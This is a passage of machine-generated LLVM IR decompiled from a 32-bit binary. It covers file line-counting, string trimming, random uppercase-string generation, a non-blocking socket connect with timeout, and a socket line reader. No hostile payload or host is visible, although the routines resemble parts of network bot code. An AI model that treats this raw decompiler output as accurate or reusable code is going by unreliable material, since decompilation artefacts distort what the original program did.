  %v0_8048f7b = load i32, i32* @ebp, align 4
  %v1_8048f87 = call i32 @function_804fa24(i32 %arg1)
  store i32 %v1_8048f87, i32* %arg2, align 4
  %v10_8048f98 = icmp eq i32 %v1_8048f87, -1
  %. = zext i1 %v10_8048f98 to i32
  store i32 %v0_8048f7b, i32* @ebp, align 4
  ret i32 %.
}

define i32 @function_8048fb2(i8* %arg1) local_unnamed_addr {
dec_label_pc_8048fb2:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048fb2 = load i32, i32* @ebp, align 4
  store i32 %v0_8048fb2, i32* %stack_var_-4, align 4
  %v4_8048fd52 = ptrtoint i8* %arg1 to i32
  %v2_8048fd83 = load i8, i8* %arg1, align 1
  %v4_8048fdb5 = icmp eq i8 %v2_8048fd83, 0
  %v1_8048fdd7 = icmp eq i1 %v4_8048fdb5, false
  br i1 %v1_8048fdd7, label %dec_label_pc_8048fba, label %dec_label_pc_8048fdf

dec_label_pc_8048fba:                             ; preds = %dec_label_pc_8048fb2, %dec_label_pc_8048fba
  %v4_8048fd59 = phi i32 [ %v5_8048fd2, %dec_label_pc_8048fba ], [ %v4_8048fd52, %dec_label_pc_8048fb2 ]
  %stack_var_4.08 = phi i8* [ %v22_8048fd2, %dec_label_pc_8048fba ], [ %arg1, %dec_label_pc_8048fb2 ]
  %v2_8048fbd = load i8, i8* %stack_var_4.08, align 1
  %v3_8048fbd = zext i8 %v2_8048fbd to i32
  %v1_8048fc6 = call i32 @function_804e674(i32 %v3_8048fbd)
  %v1_8048fd0 = trunc i32 %v1_8048fc6 to i8
  store i8 %v1_8048fd0, i8* %stack_var_4.08, align 1
  %v5_8048fd2 = add i32 %v4_8048fd59, 1
  %v22_8048fd2 = inttoptr i32 %v5_8048fd2 to i8*
  %v2_8048fd8 = load i8, i8* %v22_8048fd2, align 1
  %v4_8048fdb = icmp eq i8 %v2_8048fd8, 0
  %v1_8048fdd = icmp eq i1 %v4_8048fdb, false
  br i1 %v1_8048fdd, label %dec_label_pc_8048fba, label %dec_label_pc_8048fd5.dec_label_pc_8048fdf_crit_edge

dec_label_pc_8048fd5.dec_label_pc_8048fdf_crit_edge: ; preds = %dec_label_pc_8048fba
  %v2_8048fdf.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048fdf

dec_label_pc_8048fdf:                             ; preds = %dec_label_pc_8048fd5.dec_label_pc_8048fdf_crit_edge, %dec_label_pc_8048fb2
  %v2_8048fdf = phi i32 [ %v2_8048fdf.pre, %dec_label_pc_8048fd5.dec_label_pc_8048fdf_crit_edge ], [ %v0_8048fb2, %dec_label_pc_8048fb2 ]
  %v3_8048fd8.lcssa.in = phi i8 [ %v2_8048fd8, %dec_label_pc_8048fd5.dec_label_pc_8048fdf_crit_edge ], [ %v2_8048fd83, %dec_label_pc_8048fb2 ]
  %v3_8048fd8.lcssa = zext i8 %v3_8048fd8.lcssa.in to i32
  store i32 %v2_8048fdf, i32* @ebp, align 4
  ret i32 %v3_8048fd8.lcssa

; uselistorder directives
  uselistorder i8* %v22_8048fd2, { 1, 0 }
  uselistorder i32 %v5_8048fd2, { 1, 0 }
  uselistorder i8* %stack_var_4.08, { 1, 0 }
  uselistorder i32 (i32)* @function_804e674, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048fba, { 1, 0 }
}

define i32 @function_8048fe1(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048fe1:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_8048ffa = call i32 @function_804e450(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8052e40.22, i32 0, i32 0), i32 0)
  %v2_804915a = ptrtoint i32* %stack_var_-4112 to i32
  %tmp26 = bitcast i32* %stack_var_-4112 to i8*
  %v5_80491728 = call i32 @function_8048da1(i32 %v2_804915a, i32 4096, i32 %v5_8048ffa)
  %v1_80491779 = icmp eq i32 %v5_80491728, 0
  %v1_804917911 = icmp eq i1 %v1_80491779, false
  br i1 %v1_804917911, label %dec_label_pc_8049007, label %dec_label_pc_804917f

dec_label_pc_8049007:                             ; preds = %dec_label_pc_8048fe1, %dec_label_pc_8049139
  %v3_8049010 = call i32 @function_8048fb2(i8* %tmp26)
  %v5_8049026 = call i32 @function_804f744(i32 %v2_804915a, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8052e4e.23, i32 0, i32 0))
  %v12_8049033 = icmp eq i32 %v5_8049026, %v2_804915a
  %v1_8049035 = icmp eq i1 %v12_8049033, false
  br i1 %v1_8049035, label %dec_label_pc_8049139, label %dec_label_pc_804903b

dec_label_pc_804903b:                             ; preds = %dec_label_pc_8049007
  %tmp27 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_804904c

dec_label_pc_8049049:                             ; preds = %dec_label_pc_8049060, %dec_label_pc_8049056, %dec_label_pc_804904c
  %v5_8049049 = add i32 %v4_804904c, 1
  %v22_8049049 = inttoptr i32 %v5_8049049 to i8*
  br label %dec_label_pc_804904c

dec_label_pc_804904c:                             ; preds = %dec_label_pc_804903b, %dec_label_pc_8049049
  %storemerge4 = phi i8* [ %v22_8049049, %dec_label_pc_8049049 ], [ %tmp27, %dec_label_pc_804903b ]
  %v4_804904c = ptrtoint i8* %storemerge4 to i32
  %v2_804904f = load i8, i8* %storemerge4, align 1
  %v7_8049052 = icmp eq i8 %v2_804904f, 32
  br i1 %v7_8049052, label %dec_label_pc_8049049, label %dec_label_pc_8049056

dec_label_pc_8049056:                             ; preds = %dec_label_pc_804904c
  %v2_8049059 = load i8, i8* %storemerge4, align 1
  %v10_804905c = icmp eq i8 %v2_8049059, 9
  br i1 %v10_804905c, label %dec_label_pc_8049049, label %dec_label_pc_8049060

dec_label_pc_8049060:                             ; preds = %dec_label_pc_8049056
  %v2_8049063 = load i8, i8* %storemerge4, align 1
  %v10_8049066 = icmp eq i8 %v2_8049063, 58
  br i1 %v10_8049066, label %dec_label_pc_8049049, label %dec_label_pc_8049091.preheader

dec_label_pc_8049091.preheader:                   ; preds = %dec_label_pc_8049060
  br label %dec_label_pc_8049091

dec_label_pc_804906c:                             ; preds = %dec_label_pc_80490ba, %dec_label_pc_8049091
  %v3_8049083 = call i32 @_strlen(i8* %storemerge4)
  %v6_804908a = add i32 %v4_804904c, %v3_8049083
  %v1_804908d = add i32 %v6_804908a, -1
  %v1_804908e = inttoptr i32 %v1_804908d to i8*
  store i8 0, i8* %v1_804908e, align 1
  br label %dec_label_pc_8049091

dec_label_pc_8049091:                             ; preds = %dec_label_pc_8049091.preheader, %dec_label_pc_804906c
  %v3_80490a8 = call i32 @_strlen(i8* %storemerge4)
  %v6_80490af = add i32 %v4_804904c, %v3_80490a8
  %v1_80490b2 = add i32 %v6_80490af, -1
  %v1_80490b3 = inttoptr i32 %v1_80490b2 to i8*
  %v2_80490b3 = load i8, i8* %v1_80490b3, align 1
  %v10_80490b6 = icmp eq i8 %v2_80490b3, 13
  br i1 %v10_80490b6, label %dec_label_pc_804906c, label %dec_label_pc_80490ba

dec_label_pc_80490ba:                             ; preds = %dec_label_pc_8049091
  store i32 %v4_804904c, i32* @edi, align 4
  %v3_80490d1 = call i32 @_strlen(i8* %storemerge4)
  %v6_80490d8 = add i32 %v4_804904c, %v3_80490d1
  %v1_80490db = add i32 %v6_80490d8, -1
  %v1_80490dc = inttoptr i32 %v1_80490db to i8*
  %v2_80490dc = load i8, i8* %v1_80490dc, align 1
  %v10_80490df = icmp eq i8 %v2_80490dc, 10
  br i1 %v10_80490df, label %dec_label_pc_804906c, label %dec_label_pc_80490e3

dec_label_pc_80490e3:                             ; preds = %dec_label_pc_80490ba
  %v5_80490f1 = call i32 @function_804f6b0(i8* %storemerge4, i32 46)
  %v1_80490f6 = icmp eq i32 %v5_80490f1, 0
  br i1 %v1_80490f6, label %dec_label_pc_8049110, label %dec_label_pc_80490fa

dec_label_pc_80490fa:                             ; preds = %dec_label_pc_80490e3
  %v5_8049108 = call i32 @function_804f6b0(i8* %storemerge4, i32 46)
  %v6_8049108 = inttoptr i32 %v5_8049108 to i8*
  store i8 0, i8* %v6_8049108, align 1
  br label %dec_label_pc_8049110

dec_label_pc_8049110:                             ; preds = %dec_label_pc_80490e3, %dec_label_pc_80490fa
  store i32 %v4_804904c, i32* @eax, align 4
  %v4_804911a = inttoptr i32 %arg1 to i8*
  %v5_804911d = call i32 @function_804f6d0(i8* %v4_804911a, i32 %v4_804904c)
  %v2_8049128 = call i32 @function_804e2cc(i32 %v5_8048ffa)
  br label %dec_label_pc_8049194

dec_label_pc_8049139:                             ; preds = %dec_label_pc_8049007
  %v6_8049155 = call i32 @function_804f698(i8* %tmp26, i32 0, i32 4096)
  %v5_8049172 = call i32 @function_8048da1(i32 %v2_804915a, i32 4096, i32 %v5_8048ffa)
  %v1_8049177 = icmp eq i32 %v5_8049172, 0
  %v1_8049179 = icmp eq i1 %v1_8049177, false
  br i1 %v1_8049179, label %dec_label_pc_8049007, label %dec_label_pc_804917f

dec_label_pc_804917f:                             ; preds = %dec_label_pc_8049139, %dec_label_pc_8048fe1
  %v2_8049185 = call i32 @function_804e2cc(i32 %v5_8048ffa)
  br label %dec_label_pc_8049194

dec_label_pc_8049194:                             ; preds = %dec_label_pc_8049110, %dec_label_pc_804917f
  %storemerge = phi i32 [ 1, %dec_label_pc_804917f ], [ 0, %dec_label_pc_8049110 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804904c, { 4, 3, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_804915a, { 3, 0, 2, 1 }
  uselistorder i32 %v5_8048ffa, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_8049194, { 1, 0 }
  uselistorder label %dec_label_pc_8049110, { 1, 0 }
  uselistorder label %dec_label_pc_8049091, { 1, 0 }
  uselistorder label %dec_label_pc_804904c, { 1, 0 }
  uselistorder label %dec_label_pc_8049007, { 1, 0 }
}

define i32 @function_80491a3() local_unnamed_addr {
dec_label_pc_80491a3:
  %stack_var_-4108 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80491a3 = load i32, i32* @ebp, align 4
  store i32 %v0_80491a3, i32* %stack_var_-4, align 4
  %v4_80491a3 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80491a3, i32* @ebp, align 4
  %v5_80491c2 = call i32 @function_804e450(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8052e40.22, i32 0, i32 0), i32 0)
  %v2_8049220 = ptrtoint i32* %stack_var_-4108 to i32
  %tmp15 = bitcast i32* %stack_var_-4108 to i8*
  %v5_80492383 = call i32 @function_8048da1(i32 %v2_8049220, i32 4096, i32 %v5_80491c2)
  %v1_804923d4 = icmp eq i32 %v5_80492383, 0
  %v1_804923f6 = icmp eq i1 %v1_804923d4, false
  br i1 %v1_804923f6, label %dec_label_pc_80491cc, label %dec_label_pc_8049241

dec_label_pc_80491cc:                             ; preds = %dec_label_pc_80491a3, %dec_label_pc_80491ff
  %stack_var_-12.17 = phi i32 [ %stack_var_-12.0, %dec_label_pc_80491ff ], [ 0, %dec_label_pc_80491a3 ]
  %v3_80491d5 = call i32 @function_8048fb2(i8* %tmp15)
  %v5_80491eb = call i32 @function_804f744(i32 %v2_8049220, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8052e4e.23, i32 0, i32 0))
  %v12_80491f8 = icmp eq i32 %v5_80491eb, %v2_8049220
  %v1_80491fa = icmp eq i1 %v12_80491f8, false
  br i1 %v1_80491fa, label %dec_label_pc_80491ff, label %dec_label_pc_80491fc

dec_label_pc_80491fc:                             ; preds = %dec_label_pc_80491cc
  %v4_80491fc = add i32 %stack_var_-12.17, 1
  br label %dec_label_pc_80491ff

dec_label_pc_80491ff:                             ; preds = %dec_label_pc_80491cc, %dec_label_pc_80491fc
  %stack_var_-12.0 = phi i32 [ %stack_var_-12.17, %dec_label_pc_80491cc ], [ %v4_80491fc, %dec_label_pc_80491fc ]
  %v6_804921b = call i32 @function_804f698(i8* %tmp15, i32 0, i32 4096)
  %v5_8049238 = call i32 @function_8048da1(i32 %v2_8049220, i32 4096, i32 %v5_80491c2)
  %v1_804923d = icmp eq i32 %v5_8049238, 0
  %v1_804923f = icmp eq i1 %v1_804923d, false
  br i1 %v1_804923f, label %dec_label_pc_80491cc, label %dec_label_pc_8049241

dec_label_pc_8049241:                             ; preds = %dec_label_pc_80491ff, %dec_label_pc_80491a3
  %stack_var_-12.1.lcssa = phi i32 [ 0, %dec_label_pc_80491a3 ], [ %stack_var_-12.0, %dec_label_pc_80491ff ]
  %v2_8049247 = call i32 @function_804e2cc(i32 %v5_80491c2)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %v2_8049220, { 3, 0, 2, 1 }
  uselistorder i32 %v5_80491c2, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8048da1, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80491ff, { 1, 0 }
  uselistorder label %dec_label_pc_80491cc, { 1, 0 }
}

define i32 @function_8049251(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8049251:
  %v5_80492b318 = icmp sgt i32 %arg2, 0
  br i1 %v5_80492b318, label %dec_label_pc_8049268.lr.ph, label %dec_label_pc_80492b5

dec_label_pc_8049268.lr.ph:                       ; preds = %dec_label_pc_8049251
  %v5_804926d = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_8049268

dec_label_pc_8049268:                             ; preds = %dec_label_pc_8049268, %dec_label_pc_8049268.lr.ph
  %storemerge19 = phi i32 [ 0, %dec_label_pc_8049268.lr.ph ], [ %v4_80492aa, %dec_label_pc_8049268 ]
  %v6_804926d = add i32 %storemerge19, %v5_804926d
  store i32 %v6_804926d, i32* @ebx, align 4
  %v1_8049270 = call i32 @function_804829b(i32 %storemerge19)
  %v2_8049285 = udiv i32 %v1_8049270, 26
  %tmp = mul i32 %v2_8049285, -10
  %v2_804929d = add i32 %v1_8049270, %tmp
  %v14_804929d = trunc i32 %v2_804929d to i8
  %v2_80492a6 = add i8 %v14_804929d, 65
  %v2_80492a8 = load i32, i32* @ebx, align 4
  %v3_80492a8 = inttoptr i32 %v2_80492a8 to i8*
  store i8 %v2_80492a6, i8* %v3_80492a8, align 1
  %v4_80492aa = add nuw nsw i32 %storemerge19, 1
  %exitcond = icmp eq i32 %v4_80492aa, %arg2
  br i1 %exitcond, label %dec_label_pc_80492ad.dec_label_pc_80492b5_crit_edge, label %dec_label_pc_8049268

dec_label_pc_80492ad.dec_label_pc_80492b5_crit_edge: ; preds = %dec_label_pc_8049268
  br label %dec_label_pc_80492b5

dec_label_pc_80492b5:                             ; preds = %dec_label_pc_80492ad.dec_label_pc_80492b5_crit_edge, %dec_label_pc_8049251
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_80492ad.dec_label_pc_80492b5_crit_edge ], [ 0, %dec_label_pc_8049251 ]
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %storemerge19, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_80492bb(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80492bb:
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v4_80492c8 = ptrtoint i8* %arg2 to i32
  %v1_80492d0 = and i32 %v4_80492c8, -256
  %v5_80492d2 = call i8* @_memset(i8* %arg2, i32 %v1_80492d0, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  %v2_80492f2 = ptrtoint i32* %stack_var_-168 to i32
  %tmp40 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_80492f2, i32* @edi, align 4
  %v5_80492f9 = call i8* @_memset(i8* %tmp40, i32 0, i32 32)
  %v2_8049306 = udiv i32 %arg1, 32
  %v1_804930c = urem i32 %arg1, 32
  %v0_804930f = load i32, i32* @ebp, align 4
  %v2_804930f = mul nuw nsw i32 %v2_8049306, 4
  %v3_804930f = add nsw i32 %v2_804930f, -164
  %v4_804930f = add i32 %v3_804930f, %v0_804930f
  %v5_804930f = inttoptr i32 %v4_804930f to i32*
  %v6_804930f = load i32, i32* %v5_804930f, align 4
  %v9_804930f = shl i32 1, %v1_804930c
  %v12_804930f = or i32 %v6_804930f, %v9_804930f
  store i32 %v12_804930f, i32* %v5_804930f, align 4
  %v1_804931a = add i32 %arg1, 1
  %v2_804931b = ptrtoint i32* %stack_var_-176 to i32
  %v6_8049344 = call i32 @function_804e51c(i32 %v1_804931a, i32 %v2_80492f2, i32 0, i32 %v2_80492f2, i32 %v2_804931b)
  %tmp41 = icmp slt i32 %v6_8049344, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_80493fb, label %dec_label_pc_80493f1.preheader

dec_label_pc_80493f1.preheader:                   ; preds = %dec_label_pc_80492bb
  %v7_80493f512 = icmp sgt i32 %tmp19, 9
  br i1 %v7_80493f512, label %dec_label_pc_80493fb, label %dec_label_pc_804935b

dec_label_pc_804935b:                             ; preds = %dec_label_pc_80493f1.preheader, %dec_label_pc_80493ee
  %stack_var_-36.013 = phi i32 [ %v4_80493ee, %dec_label_pc_80493ee ], [ %tmp19, %dec_label_pc_80493f1.preheader ]
  %v0_804935b = load i32, i32* @global_var_8055900.24, align 256
  %v3_804936b = call i32 @function_8048982(i32 %v0_804935b, i32 ptrtoint ([5 x i8]* @global_var_8052e57.25 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 %v2_80492f2, i32* @edi, align 4
  %v5_8049395 = call i8* @_memset(i8* %tmp40, i32 0, i32 32)
  %v0_80493ab = load i32, i32* @ebp, align 4
  %v4_80493ab = add i32 %v3_804930f, %v0_80493ab
  %v5_80493ab = inttoptr i32 %v4_80493ab to i32*
  %v6_80493ab = load i32, i32* %v5_80493ab, align 4
  %v12_80493ab = or i32 %v6_80493ab, %v9_804930f
  store i32 %v12_80493ab, i32* %v5_80493ab, align 4
  %v6_80493e0 = call i32 @function_804e51c(i32 %v1_804931a, i32 %v2_80492f2, i32 0, i32 %v2_80492f2, i32 %v2_804931b)
  %tmp43 = icmp slt i32 %v6_80493e0, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_80493fb, label %dec_label_pc_80493ee

dec_label_pc_80493ee:                             ; preds = %dec_label_pc_804935b
  %v4_80493ee = add nsw i32 %stack_var_-36.013, 1
  %v7_80493f5 = icmp sgt i32 %stack_var_-36.013, 8
  br i1 %v7_80493f5, label %dec_label_pc_80493fb, label %dec_label_pc_804935b

dec_label_pc_80493fb:                             ; preds = %dec_label_pc_804935b, %dec_label_pc_80493ee, %dec_label_pc_80493f1.preheader, %dec_label_pc_80492bb
  %v2_804941f = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_8049465

dec_label_pc_804940a:                             ; preds = %dec_label_pc_8049465
  %v0_804940a = load i32, i32* @global_var_8055900.24, align 256
  %v5_804942c = call i32 @function_804fae0(i32 %v0_804940a, i32 %v2_804941f, i32 1, i32 0)
  %v9_8049431 = icmp eq i32 %v5_804942c, 1
  br i1 %v9_8049431, label %dec_label_pc_8049448, label %dec_label_pc_8049436

dec_label_pc_8049436:                             ; preds = %dec_label_pc_804940a
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_8049482

dec_label_pc_8049448:                             ; preds = %dec_label_pc_804940a
  %v3_8049448 = load i8, i8* %stack_var_-177, align 1
  %v4_804944f = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_8049448, i8* %stack_var_-32.0, align 1
  %v5_8049454 = add i32 %v4_804944f, 1
  %v22_8049454 = inttoptr i32 %v5_8049454 to i8*
  %v3_8049457 = load i8, i8* %stack_var_-177, align 1
  %v10_804945e = icmp eq i8 %v3_8049457, 10
  br i1 %v10_804945e, label %dec_label_pc_8049473, label %dec_label_pc_8049462

dec_label_pc_8049462:                             ; preds = %dec_label_pc_8049448
  %v4_8049462 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8049465

dec_label_pc_8049465:                             ; preds = %dec_label_pc_80493fb, %dec_label_pc_8049462
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_80493fb ], [ %v22_8049454, %dec_label_pc_8049462 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80493fb ], [ %v4_8049462, %dec_label_pc_8049462 ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_80493fb ], [ %v4_8049465, %dec_label_pc_8049462 ]
  %v4_8049465 = add i32 %stack_var_12.0, -1
  %v9_8049465 = sub i32 0, %stack_var_12.0
  %v10_8049465 = and i32 %stack_var_12.0, %v9_8049465
  %v11_8049465 = icmp slt i32 %v10_8049465, 0
  %v12_8049465 = icmp eq i32 %v4_8049465, 0
  %v13_8049465 = icmp slt i32 %v4_8049465, 0
  %v3_8049469 = icmp eq i1 %v13_8049465, %v11_8049465
  %v4_8049469 = icmp eq i1 %v12_8049465, false
  %v5_8049469 = and i1 %v4_8049469, %v3_8049469
  %v4_804946f = icmp eq i1 %v5_8049469, false
  %v1_8049471 = icmp eq i1 %v4_804946f, false
  br i1 %v1_8049471, label %dec_label_pc_804940a, label %dec_label_pc_8049473

dec_label_pc_8049473:                             ; preds = %dec_label_pc_8049448, %dec_label_pc_8049465
  %stack_var_-32.1 = phi i8* [ %v22_8049454, %dec_label_pc_8049448 ], [ %stack_var_-32.0, %dec_label_pc_8049465 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  br label %dec_label_pc_8049482

dec_label_pc_8049482:                             ; preds = %dec_label_pc_8049436, %dec_label_pc_8049473
  %storemerge = phi i32 [ -1, %dec_label_pc_8049436 ], [ %stack_var_-28.0, %dec_label_pc_8049473 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049465, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 2, 3 }
  uselistorder i8* %v22_8049454, { 1, 0 }
  uselistorder i32 %v2_80492f2, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049482, { 1, 0 }
  uselistorder label %dec_label_pc_8049473, { 1, 0 }
  uselistorder label %dec_label_pc_8049465, { 1, 0 }
  uselistorder label %dec_label_pc_80493fb, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804935b, { 1, 0 }
}

define i32 @function_8049491(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8049491:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_80494b1 = call i32 @function_804e1dc(i32 %arg1, i32 3, i32 0)
  %v4_80494b9 = or i32 %v3_80494b1, 2048
  %v3_80494d5 = call i32 @function_804e1dc(i32 %arg1, i32 4, i32 %v4_80494b9)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80494e9 = trunc i32 %arg3 to i16
  %v2_80494e9 = call i32 @function_804f998(i16 %v1_80494e9)
  store i32 %arg2, i32* @edx, align 4
  %v3_8049505 = call i32 @function_8048f7b(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_804950a = icmp eq i32 %v3_8049505, 0
  br i1 %v1_804950a, label %dec_label_pc_804951d, label %dec_label_pc_804968d

dec_label_pc_804951d:                             ; preds = %dec_label_pc_8049491
  %v2_80494f8 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8049545 = call i32 @function_804fa4c(i32 %arg1, i32 %v2_80494f8, i32 16)
  %v5_804954d = icmp slt i32 %v3_8049545, 0
  %v1_8049551 = icmp eq i1 %v5_804954d, false
  br i1 %v1_8049551, label %dec_label_pc_8049644, label %dec_label_pc_8049557

dec_label_pc_8049557:                             ; preds = %dec_label_pc_804951d
  %v1_8049557 = call i32 @function_804e694(i32 %v3_8049545)
  %v1_804955c = inttoptr i32 %v1_8049557 to i32*
  %v2_804955c = load i32, i32* %v1_804955c, align 4
  %v9_804955e = icmp eq i32 %v2_804955c, 115
  %v1_8049561 = icmp eq i1 %v9_804955e, false
  br i1 %v1_8049561, label %dec_label_pc_804968d, label %dec_label_pc_8049567

dec_label_pc_8049567:                             ; preds = %dec_label_pc_8049557
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049584 = ptrtoint i32* %stack_var_-168 to i32
  %tmp27 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049584, i32* @edi, align 4
  %v5_804958b = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v2_8049598 = udiv i32 %arg1, 32
  %v1_804959e = urem i32 %arg1, 32
  %v0_80495a1 = load i32, i32* @ebp, align 4
  %v2_80495a1 = mul nuw nsw i32 %v2_8049598, 4
  %v3_80495a1 = add nsw i32 %v2_80495a1, -164
  %v4_80495a1 = add i32 %v3_80495a1, %v0_80495a1
  %v5_80495a1 = inttoptr i32 %v4_80495a1 to i32*
  %v6_80495a1 = load i32, i32* %v5_80495a1, align 4
  %v9_80495a1 = shl i32 1, %v1_804959e
  %v12_80495a1 = or i32 %v6_80495a1, %v9_80495a1
  store i32 %v12_80495a1, i32* %v5_80495a1, align 4
  %v1_80495ac = add i32 %arg1, 1
  %v2_80495ad = ptrtoint i32* %stack_var_-176 to i32
  %v5_80495d4 = call i32 @function_804e51c(i32 %v1_80495ac, i32 0, i32 %v2_8049584, i32 0, i32 %v2_80495ad)
  %tmp28 = icmp slt i32 %v5_80495d4, 1
  br i1 %tmp28, label %dec_label_pc_804968d, label %dec_label_pc_80495dd

dec_label_pc_80495dd:                             ; preds = %dec_label_pc_8049567
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80495e7 = ptrtoint i32* %stack_var_-180 to i32
  %v2_80495f1 = ptrtoint i32* %stack_var_-184 to i32
  %v5_8049611 = call i32 @function_804faa4(i32 %arg1, i32 1, i32 4, i32 %v2_80495f1, i32 %v2_80495e7)
  %v3_8049616 = load i32, i32* %stack_var_-184, align 4
  %v1_804961c = icmp eq i32 %v3_8049616, 0
  br i1 %v1_804961c, label %dec_label_pc_8049644, label %dec_label_pc_804968d

dec_label_pc_8049644:                             ; preds = %dec_label_pc_80495dd, %dec_label_pc_804951d
  %v3_804965a = call i32 @function_804e1dc(i32 %arg1, i32 3, i32 0)
  %v4_8049662 = and i32 %v3_804965a, -2049
  %v3_804967e = call i32 @function_804e1dc(i32 %arg1, i32 4, i32 %v4_8049662)
  br label %dec_label_pc_804968d

dec_label_pc_804968d:                             ; preds = %dec_label_pc_8049557, %dec_label_pc_8049567, %dec_label_pc_80495dd, %dec_label_pc_8049491, %dec_label_pc_8049644
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_8049644 ], [ 0, %dec_label_pc_8049491 ], [ 0, %dec_label_pc_80495dd ], [ 0, %dec_label_pc_8049567 ], [ 0, %dec_label_pc_8049557 ]
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_804968d, { 4, 2, 1, 0, 3 }
}

define i32 @function_804969c() local_unnamed_addr {
dec_label_pc_804969c:
  %v0_804969f = load i32, i32* @ebx, align 4
  %v1_80496a3 = call i32 @function_804e330(i32 %v0_804969f)
  %v4_80496ab = icmp eq i32 %v1_80496a3, 0
  %v1_80496af = icmp eq i1 %v4_80496ab, false
  br i1 %v1_80496af, label %dec_label_pc_80496bc, label %dec_label_pc_80496b1

dec_label_pc_80496b1:                             ; preds = %dec_label_pc_804969c
  br label %dec_label_pc_8049798

dec_label_pc_80496bc:                             ; preds = %dec_label_pc_804969c
  %v0_80496bc = load i32, i32* @global_var_8055908.26, align 8
  %v0_80496c1 = load i32, i32* @global_var_805590c.27, align 4
  %v1_80496c7 = add i32 %v0_80496bc, 1
  %v5_80496c7 = icmp eq i32 %v0_80496bc, -1
  %v2_80496ca = zext i1 %v5_80496c7 to i32
  %v3_80496ca = add i32 %v2_80496ca, %v0_80496c1
  store i32 %v1_80496c7, i32* @global_var_8055908.26, align 8
  store i32 %v3_80496ca, i32* @global_var_805590c.27, align 4
  %v2_80496e7 = mul i32 %v1_80496c7, 4
  %v1_80496ea = add i32 %v2_80496e7, 4
  %v1_80496f0 = call i32 @function_804fd76(i32 %v1_80496ea)
  br label %dec_label_pc_8049723

dec_label_pc_8049701:                             ; preds = %dec_label_pc_8049723, %dec_label_pc_8049754
  %v2_8049704 = mul i32 %storemerge1, 4
  %v5_8049709 = add i32 %v2_8049704, %v1_80496f0
  %v0_8049714 = load i32, i32* @global_var_805b988.28, align 8
  %v2_8049719 = add i32 %v0_8049714, %v2_8049704
  %v1_804971c = inttoptr i32 %v2_8049719 to i32*
  %v2_804971c = load i32, i32* %v1_804971c, align 4
  %v2_804971e = inttoptr i32 %v5_8049709 to i32*
